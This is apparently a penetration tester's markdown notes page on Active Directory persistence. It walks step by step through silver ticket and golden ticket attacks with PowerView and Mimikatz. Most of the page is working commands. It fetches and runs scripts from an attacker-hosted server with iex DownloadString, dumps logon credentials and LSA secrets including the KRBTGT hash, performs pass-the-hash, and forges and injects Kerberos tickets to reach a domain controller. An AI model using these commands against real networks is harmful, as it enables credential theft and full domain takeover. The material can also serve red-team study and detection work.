---
title: AD Persistence
draft: false
tags:
  - windows
  - active-directory
  - post-exploitation
  - persistence
---
 
# Silver ticket
Create a valid TGS for a specific service when the password hash of the service is obtained. They only provide access to a specific resource and the system hosting that resource. There is no need to interact with the KDC for creating the TGS ticket.

> [!Requirements]
> - If the target service operates under a user account context, the password hash of the service account is required (for example MSSQL service).
> - If the target service is hosted by the computer itself, the computer account password hash is required (for example CIFS service which is used by the Windows File Share)

Steps:
1. Domain Enumeration:
```powershell
PS> powershell -ep bypass
PS> . .\PowerView.ps1

+ DOMAIN ENUMERATION +
PS> Get-Domain (check the current domain and DC)
DC = prod.research.SECURITY.local
PS> Get-DomainSID (save the domain SID)
SID = S-1-5-21-1693200156-3137632808-1858025440
PS> Find-LocalAdminAccess (find systems within the current domain where the current user we have access to has local admin access)

PS> Enter-PSSession SYSTEM_FQDN (access the system we have admin rights)
PS [remote]> whoami /priv (check admin privileges)

*host an http server or hfs with Invoke-TokenManipulation.ps1 and Invoke-Mimikatz.ps1*
PS [remote]> iex (New-Object Net.WebClient).DownloadString('http://LOCAL_IP/Invoke-TokenManipulation.ps1')
PS [remote]> Invoke-TokenManipulation -Enumerate (enumerate all tokens we have available)
*check users that are loged on*
PS [remote]> iex (New-Object Net.WebClient).DownloadString('http://LOCAL_IP/Invoke-Mimikatz.ps1')
PS [remote]> Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"' (dump NTLM hashes of all loged in users)
84398159ce4d01cfe10cf34d5dae3909
```

We need to find a computer account password hash for the target system to generate the silver ticket.

2. Perform PTH to gain domain admin privileges (privileged PSH is required):
```powershell
*Open a new privileged PS window*
PS> powershell -ep bypass
PS> . .\Invoke-Mimikatz.ps1
PS> Invoke-Mimikatz -Command '"sekurlsa::pth /user:ADMIN_USER /domain:DOMAIN_FQDN /ntlm:USER_NTLM_HASH /run:powershell.exe"'
```

2. Find the computer account password hash for the target system (DC): 
```powershell
PS [domain admin session]> powershell -ep bypass
PS [domain admin session]> . .\Invoke-Mimikatz.ps1
PS [domain admin session]> Invoke-Mimikatz -Command '"lsadump::lsa /inject"' -ComputerName TARGET_FQDN
*copy the "Hash NTLM" field for the user PROD$*
NTLM: 848dfaa9b8ed2f2b2761f5c8138653d6
TARGET_FQDN: target system where we want to generate the silver ticket (typically the DC)
```

3. Generate the silver ticket and inject it:
```powershell
Open a new PS window
PS> ls \\TARGET_SYSTEM_FQDN\c$ (we should not have access)
PS> powershell -ep bypass
PS> . .\Invoke-Mimikatz.ps1
PS> Invoke-Mimikatz -Command '"kerberos::golden /domain:DOMAIN_FQDN /sid:DOMAIN_SID /target:TARGET_SYSTEM_FQDN /service:CIFS /rc4:NTLM_HASH /user:ADM_USER /ptt"'
ADM_USER: administrator
TARGET_SYSTEM_FQDN: DC FQDN
PS> klist (verify we have the ticket)
PS> ls \\TARGET_SYSTEM_FQDN\c$ (we should be able to access the target)
```

---
# Golden ticket
Generate a TGT, escalate privileges and obtain DC access:
1. Extract administrator NTLM hash (must be domain admin):
```powershell
PS> powershell -ep bypass
PS> . .\Invoke-Mimikatz.ps1

+ EXTRACT ADMIN NTLM HASH +
PS> dir \\DC_FQDN/c$ (verify if we can access the DC -> we shouldnt)
PS> Invoke-Mimkatz -Command '"privilege::debug" "sekurlsa::logonpasswords"' (extract the NTLM hash of the users that are loged in)
*copy the NTLM hash for the user administrator*
84398159ce4d01cfe10cf34d5dae3909
```

2. Execute PtH attack
```powershell
PS> Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:DOMAIN_FQDN /ntlm:ADMIN_NTLM_HASH /run:powershell.exe"' (perform the PtH attack to obtain domain admin privileges)
```

3. Retrieve KRBTGT account hash (krbtgt is the service account that issues TGTs)
```powershell
PS [domain admin session]> powershell -ep bypass
PS [domain admin session]> . .\Invoke-Mimikatz.ps1
PS [domain admin session]> Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName DC_FQDN (dump LSA secrets on the DC and patch the process to allow exporting secrets)
*copy the KRBTGT NTLM hash*
0e3cab3ba66afddb664025d96a8dc4d2
```

4. Generate and implement a golden ticket
```powershell
PS> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:DOMAIN_FQDN /sid:DOMAIN_SID /krbtgt:KRBTGT_NTLM id:500 /groups:512 /startoffset:0 /ending:600 /renewmax:10080 /ptt"'
Parameters:
user: user for whom the ticket is generated
domain: domain
sid: SID of the domain
krbtgt: ntlm hash of the krbtgt account
id: user rid (admin standard: 500)
group: user group membership (admin standard: 512)
startoffset: ticket valid time
ending: expiration time
renewmax: maximum renewable time
ptt: injects the ticket into the current PSH session

PS> klist (check if we have created the golden ticket)
```

5. Access to DC
```powershell
PS> dir \\DC_FQDN\c$
```

---
# Bonus
```powershell
PS> klist purge (deletes all tickets for current session. Useful if we generated a bad ticket)
```